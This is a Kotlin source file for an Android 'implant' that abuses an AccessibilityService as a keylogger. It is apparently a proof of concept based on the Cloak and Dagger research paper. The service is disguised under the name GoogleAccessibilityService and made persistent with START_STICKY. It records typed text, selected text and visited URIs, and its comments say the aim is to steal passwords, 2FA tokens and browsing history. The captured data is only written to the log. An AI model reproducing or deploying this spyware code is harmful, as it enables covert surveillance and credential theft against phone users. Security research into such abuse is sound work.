/*
* Uses an AccessibilityService as a keylogger.
* Based on Cloak and Dagger: From Two Permissions to Complete Control of the UI Feedback Loop by
* Yanick Fratantonio, Chenxiong Qian, Simon P. Chung, Wenke Lee. 
* 
* Although this cannot see passwords from EditText due to Android's restrictions, we can see text
* the user selects, browser history and non-password text they enter.
* */
package com.cooperthecoder.implant

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Service
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class GoogleAccessibilityService() : AccessibilityService() {

    val TAG: String = javaClass.name

    override fun onInterrupt() {
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return Service.START_STICKY;
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) {
            return
        }

        Log.d(TAG, event.packageName.toString())
        logEventText(event)
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                // This event type is fired when text is entered in any EditText that is not a
                // password.
                for (string in event.strings()) {
                    Log.d(TAG, "Captured from EditText: $string")
                }
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                // This event type includes clicked links, as well as selected text.
                // We can record their browsing history as well as steal passwords and 2FA tokens
                // that are selected.
                for (string in event.selected()) {
                    Log.d(TAG, "Text selected: $string")
                }
                for (uri in event.uris()) {
                    Log.d(TAG, "URI detected: $uri")
                }
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo()
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED or
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        serviceInfo = info
    }

    private fun logEventText(event: AccessibilityEvent) {
        for (text in event.text) {
            Log.d(TAG, text.toString())
        }
        Log.d(TAG, event.eventTypeName())
    }

}


fun AccessibilityEvent.strings(): List<String> {
    return text.map {
        it.toString()
    }
}

fun AccessibilityEvent.selected(): List<String> {
    return strings().minus(uris())
}

fun AccessibilityEvent.uris(): List<String> {
    // Return all URIs in an accessibility event.
    return strings().filter {
        it.contains("://")
    }
}

fun AccessibilityEvent.eventTypeName(): String {
    return AccessibilityEvent.eventTypeToString(eventType)
}